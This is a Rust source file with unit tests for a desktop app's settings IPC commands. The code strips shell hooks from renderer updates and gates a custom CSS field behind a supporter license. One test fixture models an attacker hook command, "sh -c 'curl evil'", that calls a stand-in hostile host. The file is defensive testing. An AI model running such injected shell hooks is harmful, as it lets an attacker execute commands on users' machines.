use crate::config;
use crate::supporter;
use crate::SupporterAppState;

use super::super::settings::Settings;
use super::super::Scheduler;

/// Return a clone of the active profile's `Settings`. The renderer
/// calls this on mount and again whenever the active profile changes.
///
/// `custom_css` is blanked for non-supporters so the renderer can't
/// apply (or even read back) a stylesheet they aren't licensed for.
/// The on-disk value is preserved — re-activating the license restores it.
#[tauri::command]
pub async fn get_settings(
    scheduler: tauri::State<'_, Scheduler>,
    supporter_state: tauri::State<'_, SupporterAppState>,
) -> Result<Settings, String> {
    let mut s = scheduler.settings.lock().await.clone();
    if !supporter::is_supporter_now(&supporter_state.path) {
        s.custom_css = String::new();
    }
    Ok(s)
}

/// Replace the active profile's settings with `new` and persist.
///
/// Hook fields are stripped from the payload before merge (see
/// `strip_hooks`) — hooks must go through `set_hooks` so the user
/// confirmation dialog can fire. `custom_css` is gated the same way:
/// non-supporters can't change it (we substitute the previously-persisted
/// value), and the value gets sanitised + clamped before write.
/// Returns when the write hits disk.
#[tauri::command]
pub async fn update_settings(
    scheduler: tauri::State<'_, Scheduler>,
    supporter_state: tauri::State<'_, SupporterAppState>,
    new: Settings,
) -> Result<(), String> {
    let is_supporter = supporter::is_supporter_now(&supporter_state.path);
    let merged = {
        let current = scheduler.settings.lock().await;
        let mut m = strip_hooks(new, &current);
        m = gate_custom_css(m, &current, is_supporter);
        m.clamp();
        m
    };
    *scheduler.settings.lock().await = merged.clone();
    {
        let active = scheduler.active_profile_name.lock().await.clone();
        let mut profiles = scheduler.profiles.lock().await;
        if let Some(p) = profiles.iter_mut().find(|p| p.name == active) {
            p.settings = merged.clone();
        } else {
            profiles.push(config::Profile {
                name: active,
                settings: merged.clone(),
            });
        }
    }
    super::super::persist_profiles(scheduler.inner()).await;
    Ok(())
}

// Hooks must never be set through `update_settings` — they require explicit
// confirmation. Anything coming over the renderer IPC has its hook fields
// overwritten with whatever is currently persisted before merge.
fn strip_hooks(mut new: Settings, current: &Settings) -> Settings {
    new.hooks = current.hooks.clone();
    new.hooks_enabled = current.hooks_enabled;
    new
}

// Non-supporters get the previously-persisted `custom_css` substituted
// back in. That preserves a license-holder's stylesheet across a lapse +
// re-activation, and prevents a non-supporter from ever writing one.
fn gate_custom_css(mut new: Settings, current: &Settings, is_supporter: bool) -> Settings {
    if !is_supporter {
        new.custom_css = current.custom_css.clone();
    }
    new
}

#[cfg(test)]
mod tests {
    use super::super::super::settings::BreakKindSettings;
    use super::*;
    use crate::hooks::{Hook, HookEvent};

    #[test]
    fn strip_hooks_keeps_current_hook_fields_and_takes_other_fields_from_new() {
        let current = Settings {
            hooks_enabled: true,
            hooks: vec![Hook {
                event: HookEvent::BreakStart,
                command: "trusted".to_string(),
                enabled: true,
            }],
            micro: BreakKindSettings {
                interval_secs: 1500,
                ..Settings::default().micro
            },
            ..Settings::default()
        };
        let attacker = Settings {
            hooks_enabled: true,
            hooks: vec![Hook {
                event: HookEvent::BreakEnd,
                command: "sh -c 'curl evil'".to_string(),
                enabled: true,
            }],
            micro: BreakKindSettings {
                interval_secs: 60,
                ..Settings::default().micro
            },
            ..Settings::default()
        };
        let merged = strip_hooks(attacker, &current);
        assert_eq!(
            merged.micro.interval_secs, 60,
            "non-hook fields pass through"
        );
        assert!(merged.hooks_enabled, "hooks_enabled comes from current");
        assert_eq!(merged.hooks.len(), 1);
        assert_eq!(
            merged.hooks[0].command, "trusted",
            "hooks come from current"
        );
    }

    #[test]
    fn strip_hooks_blocks_enabling_when_current_disabled() {
        let current = Settings {
            hooks_enabled: false,
            hooks: vec![],
            ..Settings::default()
        };
        let attacker = Settings {
            hooks_enabled: true,
            hooks: vec![Hook {
                event: HookEvent::BreakStart,
                command: "malicious".to_string(),
                enabled: true,
            }],
            ..Settings::default()
        };
        let merged = strip_hooks(attacker, &current);
        assert!(!merged.hooks_enabled);
        assert!(merged.hooks.is_empty());
    }

    #[test]
    fn gate_custom_css_substitutes_current_for_non_supporter() {
        let current = Settings {
            custom_css: ".saved { color: red; }".to_string(),
            ..Settings::default()
        };
        let incoming = Settings {
            custom_css: ".attempted { color: blue; }".to_string(),
            ..Settings::default()
        };
        let merged = gate_custom_css(incoming, &current, false);
        assert_eq!(
            merged.custom_css, ".saved { color: red; }",
            "non-supporter cannot overwrite stored CSS"
        );
    }

    #[test]
    fn gate_custom_css_substitutes_current_even_when_clearing() {
        // A non-supporter renderer reads back "" (we blank on get_settings)
        // and would naively echo that back on the next write. That must
        // NOT clobber the persisted value.
        let current = Settings {
            custom_css: ".saved { color: red; }".to_string(),
            ..Settings::default()
        };
        let echoed_empty = Settings {
            custom_css: String::new(),
            ..Settings::default()
        };
        let merged = gate_custom_css(echoed_empty, &current, false);
        assert_eq!(merged.custom_css, ".saved { color: red; }");
    }

    #[test]
    fn gate_custom_css_lets_supporter_overwrite() {
        let current = Settings {
            custom_css: ".old { color: red; }".to_string(),
            ..Settings::default()
        };
        let incoming = Settings {
            custom_css: ".new { color: blue; }".to_string(),
            ..Settings::default()
        };
        let merged = gate_custom_css(incoming, &current, true);
        assert_eq!(merged.custom_css, ".new { color: blue; }");
    }

    #[test]
    fn gate_custom_css_lets_supporter_clear() {
        let current = Settings {
            custom_css: ".old { color: red; }".to_string(),
            ..Settings::default()
        };
        let incoming = Settings {
            custom_css: String::new(),
            ..Settings::default()
        };
        let merged = gate_custom_css(incoming, &current, true);
        assert_eq!(merged.custom_css, "");
    }
}
